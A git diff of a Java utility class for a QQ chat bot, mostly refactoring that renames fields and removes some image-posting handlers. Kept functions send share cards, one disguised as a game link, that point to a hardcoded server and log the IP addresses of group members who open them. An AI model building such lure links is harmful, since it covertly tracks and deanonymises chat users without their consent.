@@ -9,6 +9,8 @@ import java.security.*;
 import java.text.*;
 import java.util.*;
 import org.jsoup.*;
+import com.meng.modules.*;
+import com.meng.config.*;
 
 public class Tools {
 
@@ -173,99 +175,13 @@ public class Tools {
 		public static String getDate(long timeStamp) {
 			return new SimpleDateFormat("yyyy-MM-dd").format(new Date(timeStamp));
 		}
-		public static boolean isPohaitu(long fromGroup, long fromQQ, String msg) {
-			if (msg.equals("迫害图")) {
-				String[] strings = (new File(Autoreply.appDirectory + "pohai/")).list();
-				StringBuilder sBuilder = new StringBuilder("现在有");
-				for (String s : strings) {
-					sBuilder.append(" ").append(s);
-				}
-				sBuilder.append("的迫害图");
-				Autoreply.sendMessage(fromGroup, fromQQ, sBuilder.toString());
-				return true;
-			}
-			if (msg.endsWith("迫害图")) {
-				switch (msg) {
-					case "零食迫害图":
-						msg = "鸽鸽迫害图";
-						break;
-					case "旭东迫害图":
-						msg = "天星厨迫害图";
-						break;
-					case "星小渚迫害图":
-						msg = "杏子迫害图";
-						break;
-				}
-				File[] files = (new File(Autoreply.appDirectory + "pohai/" + msg.replace("迫害图", ""))).listFiles();
-				if (files != null && files.length > 0) {
-					Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(files)))));
-					Autoreply.instence.useCount.incPohaitu(fromQQ);
-					Autoreply.instence.groupCount.incPohaitu(fromGroup);
-					Autoreply.instence.useCount.incPohaitu(Autoreply.CQ.getLoginQQ());
-				}
-				return true;
-			}
-			return false;
-		}
-		public static boolean isSetu(long fromGroup, long fromQQ, String msg) {
-			if (msg.equals("色图")) {
-				String[] strings = (new File(Autoreply.appDirectory + "setu/")).list();
-				StringBuilder sBuilder = new StringBuilder("现在有");
-				for (String s : strings) {
-					sBuilder.append(" ").append(s);
-				}
-				sBuilder.append("的色图");
-				Autoreply.sendMessage(fromGroup, fromQQ, sBuilder.toString());
-				return true;
-			} else if (msg.equals("随机色图")) {
-				File[] files = (new File(Autoreply.appDirectory + "setu/")).listFiles();
-				File folder = (File) Tools.ArrayTool.rfa(files);
-				File[] pics = folder.listFiles();
-				Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(pics)))));
-				Autoreply.instence.useCount.incSetu(fromQQ);
-				Autoreply.instence.groupCount.incSetu(fromGroup);
-				Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
-			} else if (msg.endsWith("色图")) {
-				File[] files = (new File(Autoreply.appDirectory + "setu/" + msg.replace("色图", ""))).listFiles();
-				if (files != null && files.length > 0) {
-					Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(files)))));
-					Autoreply.instence.useCount.incSetu(fromQQ);
-					Autoreply.instence.groupCount.incSetu(fromGroup);
-					Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
-				}
-				return true;
-			}
-			return false;
-		}
-		public static boolean isNvZhuang(long fromGroup, long fromQQ, String msg) {
-			if (msg.equals("随机女装")) {
-				File[] files = (new File(Autoreply.appDirectory + "nvzhuang/")).listFiles();
-				File folder = (File) Tools.ArrayTool.rfa(files);
-				File[] pics = folder.listFiles();
-				Autoreply.instence.useCount.incSetu(fromQQ);
-				Autoreply.instence.groupCount.incSetu(fromGroup);
-				Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
-				Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(pics)))));
-			} else if (msg.endsWith("女装")) {
-				File[] files = (new File(Autoreply.appDirectory + "nvzhuang/" + msg.replace("女装", ""))).listFiles();
-				if (files != null && files.length > 0) {
-					Autoreply.instence.useCount.incSetu(fromQQ);
-					Autoreply.instence.groupCount.incSetu(fromGroup);
-					Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
-					Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(files)))));
-				}
-				return true;
-			}
-
-			return false;
-		}
 		// 窥屏检测
 		public static boolean checkLook(long fromGroup, String msg) {
 			if (msg.equals("有人吗") || msg.equalsIgnoreCase("testip") || msg.equalsIgnoreCase("窥屏检测")) {
-				int port = Autoreply.instence.random.nextInt(5000);
-				Autoreply.sendMessage(fromGroup, 0, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "窥屏检测", "滴滴滴", "http://123.207.65.93:" + (port + 4000) + "/111.jpg"));
+				int port = Autoreply.instance.random.nextInt(5000);
+				Autoreply.sendMessage(fromGroup, 0, Autoreply.instance.CC.share("http://123.207.65.93:" + (port + 4000), "窥屏检测", "滴滴滴", "http://123.207.65.93:" + (port + 4000) + "/111.jpg"));
 				final IPGetter ipGetter = new IPGetter(fromGroup, port);
-				Autoreply.instence.threadPool.execute(ipGetter);
+				Autoreply.instance.threadPool.execute(ipGetter);
 				Timer timer = new Timer();
 				timer.schedule(new TimerTask() {
 						@Override
@@ -279,12 +195,12 @@ public class Tools {
 			return false;
 		}
 		public static boolean checkXiong(long fromQQ, String msg) {
-			if (Autoreply.instence.configManager.isAdmin(fromQQ)) {
+			if (ConfigManager.instance.isAdmin(fromQQ)) {
 				if (msg.equals("吊熊")) {
-					int port = Autoreply.instence.random.nextInt(5000);
-					Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+					int port = Autoreply.instance.random.nextInt(5000);
+					Autoreply.sendMessage(0, fromQQ, Autoreply.instance.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
 					final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
-					Autoreply.instence.threadPool.execute(ipGetter);
+					Autoreply.instance.threadPool.execute(ipGetter);
 					Timer timer = new Timer();
 					timer.schedule(new TimerTask() {
 							@Override
@@ -295,43 +211,22 @@ public class Tools {
 					return true;
 				}
 				if (msg.equals("吊熊2")) {
-					int port = Autoreply.instence.random.nextInt(5000);
-					Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+					int port = Autoreply.instance.random.nextInt(5000);
+					Autoreply.sendMessage(0, fromQQ, Autoreply.instance.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
 					XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
-					Autoreply.instence.threadPool.execute(ipGetter);
+					Autoreply.instance.threadPool.execute(ipGetter);
 					return true;
 				}
 			}
 			return false;
 		}
-		public static boolean checkAt(long fromGroup, long fromQQ, String msg) {
-			if (msg.contains("~") || msg.contains("～")) {
-				return false;
-			}
-			if (Autoreply.instence.CC.getAt(msg) == Autoreply.CQ.getLoginQQ()) {
-				if (msg.startsWith("精神支柱[CQ:at") || msg.startsWith("神触[CQ:at")) {
-					Autoreply.instence.picEditManager.check(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
-					return true;
-				}
-				// 过滤特定的文字
-				// @消息发送者并复读内容
-				if (msg.contains("蓝") || msg.contains("藍") || msg.contains("赠送")) {
-					return true;
-				}
-				if (fromQQ == 2558395159L || fromQQ == 1281911569L || fromQQ == Autoreply.instence.configManager.configJavaBean.ogg) {
-					return true;
-				}
-				Autoreply.sendMessage(fromGroup, 0, msg.replace("[CQ:at,qq=" + Autoreply.CQ.getLoginQQ() + "]", "[CQ:at,qq=" + fromQQ + "]"));
-				return true;
-			}
-			return false;
-		}
+
 		public static void findQQInAllGroup(long fromGroup, long fromQQ, String msg) {
 			long findqq;
 			try {
 				findqq = Long.parseLong(msg.substring(10));
 			} catch (Exception e) {
-				findqq = Autoreply.instence.CC.getAt(msg);
+				findqq = Autoreply.instance.CC.getAt(msg);
 			}
 			if (findqq <= 0) {
 				Autoreply.sendMessage(fromGroup, fromQQ, "QQ账号错误");
@@ -364,7 +259,7 @@ public class Tools {
 			return hashSet;
 		}
 		public static boolean isAtme(String msg) {
-			List<Long> list = Autoreply.instence.CC.getAts(msg);
+			List<Long> list = Autoreply.instance.CC.getAts(msg);
 			long me = Autoreply.CQ.getLoginQQ();
 			for (long l : list) {
 				if (l == me) {
@@ -374,20 +269,20 @@ public class Tools {
 			return false;
 		}
 		public static boolean ban(long fromGroup, long banQQ, int time) {
-			if (banQQ == 2558395159L || Autoreply.instence.configManager.isAdmin(banQQ)) {
+			if (banQQ == 2558395159L || ConfigManager.instance.isAdmin(banQQ)) {
 				return false;
 			}
 			Member me = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.CQ.getLoginQQ());
 			Member ban = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, banQQ);
 			if (me.getAuthority() - ban.getAuthority() > 0) {
 				Autoreply.CQ.setGroupBan(fromGroup, banQQ, time);
-				Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
+				ModuleManager.instance.getModule(UserCounter.class).incGbanCount(Autoreply.CQ.getLoginQQ());
 				return true;
 			} else {
-				Member ogg = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.instence.configManager.configJavaBean.ogg);
+				Member ogg = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, ConfigManager.instance.configJavaBean.ogg);
 				if (ogg != null && ogg.getAuthority() - ban.getAuthority() > 0) {
 					Autoreply.sendMessage(Autoreply.mainGroup, 0, "~mutegroupuser " + fromGroup + " " + (time / 60) + " " + banQQ);
-					Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
+					ModuleManager.instance.getModule(UserCounter.class).incGbanCount(Autoreply.CQ.getLoginQQ());
 					return true;
 				}
 			}
@@ -403,7 +298,7 @@ public class Tools {
 		}
 		public static void ban(long fromGroup, long[] banQQs, float time) {
 			Member me = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.CQ.getLoginQQ());
-			Member ogg = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.instence.configManager.configJavaBean.ogg);
+			Member ogg = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, ConfigManager.instance.configJavaBean.ogg);
 			StringBuilder banqqs = new StringBuilder("");
 			for (long banQQ : banQQs) {
 				if (banQQ == 2558395159L) {
@@ -412,10 +307,10 @@ public class Tools {
 				Member ban = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, banQQ);
 				if (me.getAuthority() - ban.getAuthority() > 0) {
 					Autoreply.CQ.setGroupBan(fromGroup, banQQ, (int)time);
-					Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
+					ModuleManager.instance.getModule(UserCounter.class).incGbanCount(Autoreply.CQ.getLoginQQ());
 				} else if (ogg != null && ogg.getAuthority() - ban.getAuthority() > 0) {
 					banqqs.append(" ").append(banQQ);
-					Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
+					ModuleManager.instance.getModule(UserCounter.class).incGbanCount(Autoreply.CQ.getLoginQQ());
 				}
 			}
 			if (!banqqs.toString().equals("")) {
@@ -467,7 +362,7 @@ public class Tools {
 			return finalArray;
 		}
 		public static Object rfa(Object[] array) {
-			return array[Autoreply.instence.random.nextInt(array.length)];
+			return array[Autoreply.instance.random.nextInt(array.length)];
 		}
 	}
 
